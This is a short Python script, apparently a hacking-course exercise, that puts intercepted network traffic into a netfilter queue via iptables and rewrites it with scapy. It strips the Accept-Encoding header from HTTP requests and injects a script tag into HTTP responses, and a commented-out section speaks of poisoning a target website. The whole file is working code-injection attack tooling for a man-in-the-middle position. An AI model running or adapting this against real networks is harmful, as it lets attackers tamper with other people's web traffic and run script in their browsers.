#!/usr/bin/env python
import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse
import re

# def get_arguments():
#     parser = argparse.ArgumentParser()
#     parser.add_argument("-t", "--target", dest="target", help="Target website that you want to poison")
#     parser.add_argument("-s", "--spoof", dest="spoof", help="IP that you want to spoof instead of showing the real website. Usually  your own machine")
#     args = parser.parse_args()
#     if not args.target:
#         parser.error("No target provided, use --help")
#     elif not args.spoof:
#          parser.error("No spoof IP provided, use --help")
#     return args

# args = get_arguments()
# print(args.target, args.spoof)

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request: ")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
           print("[+] HTTP Response")
           modified_load = scapy_packet[scapy.Raw].load.replace("</table>","<script>alert('test');</script></table>")
           new_packet = set_load(scapy_packet, modified_load)
           packet.set_payload(str(new_packet))
    packet.accept()

try:
    print("[+] Amening IP tables")
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 1", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 1", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\r\n[-] Detected CTRL + C.....Quitting and restoring IP tables")
    subprocess.call("iptables --flush", shell=True)

